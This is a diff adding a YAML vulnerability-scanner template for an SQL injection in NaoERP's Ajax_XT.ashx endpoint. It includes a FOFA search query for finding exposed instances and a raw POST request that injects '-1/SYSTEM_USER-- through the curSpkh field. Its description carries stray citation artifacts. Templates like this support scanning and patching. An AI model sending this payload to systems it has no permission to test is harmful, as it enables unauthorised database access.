@@ -1,0 +1,68 @@
+id: naoerp-ajax-xt-sqli
+
+info:
+  name: NaoERP /Service/Ajax_XT.ashx - SQL Injection
+  author: iSee857
+  severity: high
+  description: |
+    NaoERP is affected by a SQL injection vulnerability in /Service/Ajax_XT.ashx.
+    Public analysis indicates that when curFlag=PicSord, parameters such as curSpkh and curPxbh
+    may be directly concatenated into backend SQL statements without proper sanitization or
+    parameterization, allowing attackers to trigger database error responses and potentially
+    extract sensitive information. :contentReference[oaicite:0]{index=0}
+  remediation: |
+    - Apply the vendor patch or upgrade to a fixed version as soon as possible.
+    - Use parameterized queries (prepared statements) for all user-controlled parameters, especially curSpkh and curPxbh.
+    - Enforce strict input validation and reject malformed or unexpected input values.
+    - Restrict access to the affected endpoint to trusted internal networks and authenticated users only.
+    - Monitor logs for repeated database error probes and block suspicious sources.
+  impact: |
+    Successful exploitation may allow attackers to disclose sensitive database information,
+    enumerate backend database details, and potentially manipulate application data. Public reporting
+    specifically describes this endpoint as vulnerable to SQL injection under the PicSord flow. :contentReference[oaicite:1]{index=1}
+  reference:
+    - https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    vendor: naoerp
+    product: naoerp-erp
+    verified: true
+    max-request: 1
+    fofa-query: title="VSQL" && body="/Scripts/Login_A8/"
+  tags: 九佳易管理系统
+
+http:
+  - raw:
+      - |
+        POST /Service/Ajax_XT.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="curFlag"
+
+        PicSord
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="curPxbh"
+
+        1,2
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="curSpkh"
+
+        '-1/SYSTEM_USER--
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'nvarchar'
+          - '数据类型'
+        condition: and
+
+      - type: status
+        status:
+          - 500
